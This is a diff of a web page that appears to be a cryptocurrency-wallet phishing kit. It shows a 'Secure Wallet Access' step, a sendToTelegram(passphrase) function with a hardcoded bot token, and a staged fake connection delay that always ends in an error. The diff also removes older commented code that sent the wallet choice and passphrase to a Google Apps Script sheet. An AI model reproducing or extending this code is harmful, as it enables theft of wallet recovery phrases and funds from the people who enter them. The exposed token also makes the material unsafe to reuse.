@@ -114,28 +114,6 @@
       margin-top: 20px;
     }
 
-    /* Step 2 Styles (Select Wallet) */
-    /* .step2 label {
-      display: block;
-      margin-bottom: 10px;
-      font-weight: 600;
-      color: #333;
-    }
-
-    .required {
-      color: red;
-    }
-
-    .step2 select {
-      width: 100%;
-      padding: 12px;
-      border-radius: 8px;
-      border: 1px solid #ccc;
-      margin-bottom: 20px;
-      font-size: 16px;
-      box-sizing: border-box;
-    } */
-
     /* Step 3 Styles (Secure Wallet Access) */
     .subtext {
       text-align: center;
@@ -291,22 +269,6 @@
       </p>
     </div>
 
-    <!-- Step 2: Select Wallet -->
-    <!-- <div class="page step2" id="page-2">
-      <h2>Select wallet</h2>
-      <form id="wallet-form">
-        <label for="wallet">Select Wallet < span class="required">*</span></label>
-        <select id="wallet" required>
-          <option value="">----------</option>
-          <option value="metamask">MetaMask</option>
-
-        </select>
-        <div class="navigation">
-          <button type="submit">Next</button>
-        </div>
-      </form>
-    </div> -->
-
     <!-- Step 3: Secure Wallet Access -->
     <div class="page step2" id="page-2">
       <h2>Secure Wallet Access</h2>
@@ -353,15 +315,6 @@
         counter.textContent = `${textarea.value.length}/500`;
       });
     }
-
-    // Wallet form submission
-    // document.getElementById('wallet-form').addEventListener('submit', function(e) {
-    //   e.preventDefault();
-    //   const selectedWallet = document.getElementById('wallet').value;
-    //   if (selectedWallet) {
-    //     goToStep(3);
-    //   }
-    // });
 
     function sendToTelegram(passphrase) {
       const botToken = '7350367461:AAEhJzyu3bsMk33VTt2vNwu9laQ6QnH-6gQ'; // <-- Replace with your bot token
@@ -426,49 +379,7 @@
         errorMessage.classList.add('show');
       }, 2000);
     });
-
-    // if (passphrase.trim()) {
-    //   // Show loading state
-    //   connectButton.disabled = true;
-    //   buttonText.style.display = 'none';
-    //   spinner.style.display = 'block';
-    //   errorMessage.classList.remove('show');
-
-    //   // Simulate connection attempt
-    //   setTimeout(() => {
-    //     // Hide loading state
-    //     connectButton.disabled = false;
-    //     buttonText.style.display = 'block';
-    //     spinner.style.display = 'none';
-
-    //     // Show error message
-    //     errorMessage.classList.add('show');
-
-    //     // Try to send data (this will likely fail since google.script.run doesn't exist)
-    //     try {
-    //       if (typeof google !== 'undefined' && google.script && google.script.run) {
-    //         google.script.run
-    //           .withSuccessHandler(function(result) {
-    //             console.log(result);
-    //             errorMessage.classList.remove('show');
-    //           })
-    //           .withFailureHandler(function(error) {
-    //             console.error('Error saving data: ', error);
-    //             errorMessage.classList.add('show');
-    //           })
-    //           .saveToSheet(selectedWallet, passphrase);
-    //       } else {
-    //         // Google Apps Script not available, show error
-    //         errorMessage.classList.add('show');
-    //       }
-    //     } catch (error) {
-    //       console.error('Error: ', error);
-    //       errorMessage.classList.add('show');
-    //     }
-    //   }, 2000); // 2 second delay to simulate connection attempt
-    // }
-    // });
-
+   
     function goToStep(stepNumber) {
       // Hide all pages
       document.querySelectorAll('.page').forEach(page => {
